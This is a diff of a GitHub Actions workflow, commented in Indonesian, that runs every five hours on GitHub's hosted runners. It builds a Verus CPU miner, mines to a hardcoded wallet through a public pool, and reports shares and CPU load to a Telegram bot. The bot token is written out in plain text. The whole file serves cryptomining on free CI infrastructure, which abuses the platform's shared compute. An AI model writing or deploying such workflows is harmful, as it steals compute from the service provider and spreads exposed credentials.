@@ -1,81 +1,91 @@
-name: Verus Miner (Auto & Telegram)
+name: Verus Miner (Auto‑Restart + Live Share + CPU)
 
 on:
   schedule:
-    - cron: "0 */5 * * *"  # Auto-run tiap 5 jam
+    - cron: "0 */5 * * *"   # setiap 5 jam
   workflow_dispatch:
 
 jobs:
-  verusmine:
+  mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 300  # Force stop tiap 5 jam
+    timeout-minutes: 300     # 5 jam
 
     steps:
       - name: Install dependencies
         run: |
           sudo apt update
           sudo apt install -y \
-            build-essential git cmake automake libtool autoconf pkg-config \
-            libcurl4-openssl-dev screen
+            git build-essential cmake automake libtool autoconf pkg-config \
+            libcurl4-openssl-dev screen sysstat
 
-      - name: Clone & build ccminer
+      - name: Clone & build cpuminer‑verus2 (CPU‑only)
         run: |
-          git clone https://github.com/monkins1010/ccminer.git
-          cd ccminer
-          chmod +x build.sh
+          git clone https://github.com/monkins1010/veruscoin-cpuminer.git cpuminer
+          cd cpuminer
           ./build.sh
 
       - name: Start mining
         run: |
-          cd ccminer
+          cd cpuminer
 
-          # Konfigurasi
+          # ===== Konfigurasi =====
           WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
           POOL="stratum+tcp://na.luckpool.net:3956"
           THREADS=2
           WORKER="GH-${{ github.run_id }}"
           LOG_FILE="log.txt"
-          MAX_IDLE=600  # 10 menit
+          MAX_IDLE=600            # 10 menit
 
-          TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
-          TELEGRAM_CHAT_ID="5763229296"
+          TELOK="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
+          CHAT="5763229296"
 
-          send_telegram() {
-            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage \
-              -d chat_id=${TELEGRAM_CHAT_ID} \
+          send() {
+            curl -s -X POST "https://api.telegram.org/bot${TELOK}/sendMessage" \
+              -d chat_id="${CHAT}" \
               -d parse_mode=Markdown \
-              -d text="$1"
+              -d text="$1" >/dev/null
           }
 
-          send_telegram "⛏️ *Mining dimulai* di *$WORKER* dengan $THREADS thread."
+          cpu_usage() {
+            LOAD=$(grep -oP 'load average: \K[0-9.]+' < /proc/loadavg)
+            TEMP=$(sensors 2>/dev/null | grep -m1 -oP '\+?\d+(\.\d+)?°C' || echo "N/A")
+            echo "\n🧠 CPU load: *$LOAD*, Temp: *$TEMP*"
+          }
 
-          # Mulai mining di background
-          rm -f "$LOG_FILE"
-          ./ccminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t $THREADS | tee "$LOG_FILE" &
+          send "⛏️ *Mining dimulai*\nWorker: *$WORKER*\nThreads: *$THREADS*$(cpu_usage)"
+
+          : > "$LOG_FILE"
+          ./cpuminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t $THREADS 2>&1 | tee -a "$LOG_FILE" &
           PID=$!
-          LAST_ACCEPTED=$(date +%s)
+          LAST_ACCEPT=$(date +%s)
+          LAST_CPU=$(date +%s)
 
-          # Monitoring loop
-          while sleep 60; do
-            if ! kill -0 $PID 2>/dev/null; then
-              send_telegram "❌ *Miner crash* di *$WORKER*."
-              exit 1
-            fi
+          while sleep 10; do              # loop 10‑detik
+            [ -e /proc/$PID ] || { send "❌ *Miner crash* di *$WORKER*"; exit 1; }
 
-            LAST_LINE=$(tail -n 1 "$LOG_FILE")
+            LINE=$(tail -n1 "$LOG_FILE")
             NOW=$(date +%s)
 
-            if echo "$LAST_LINE" | grep -q "accepted"; then
-              LAST_ACCEPTED=$NOW
+            # Live notifikasi jika share
+            if echo "$LINE" | grep -q "accepted"; then
+              LAST_ACCEPT=$NOW
+              SHARE_NO=$(grep -c "accepted" "$LOG_FILE")
+              send "✅ *Share #$SHARE_NO* diterima oleh *$WORKER*"
             fi
 
-            DIFF=$((NOW - LAST_ACCEPTED))
-            if [ $DIFF -gt $MAX_IDLE ]; then
-              send_telegram "⚠️ *Tidak ada share diterima* selama 10 menit. Restarting miner di *$WORKER*..."
+            # Kirim CPU usage setiap jam
+            if (( NOW - LAST_CPU >= 3600 )); then
+              send "⏱ *1‑hour update*$(cpu_usage)"
+              LAST_CPU=$NOW
+            fi
+
+            # Restart jika idle
+            if (( NOW - LAST_ACCEPT > MAX_IDLE )); then
+              send "⚠️ *Tidak ada share 10 menit* – restart miner di *$WORKER*"
               kill $PID
               break
             fi
           done
 
-          SHARES=$(grep -c "accepted" "$LOG_FILE")
-          send_telegram "✅ *Mining selesai* di *$WORKER*. Total accepted shares: *$SHARES*"
+          TOTAL=$(grep -c "accepted" "$LOG_FILE")
+          send "✅ *Session selesai*\nWorker: *$WORKER*\nTotal share: *$TOTAL*$(cpu_usage)"
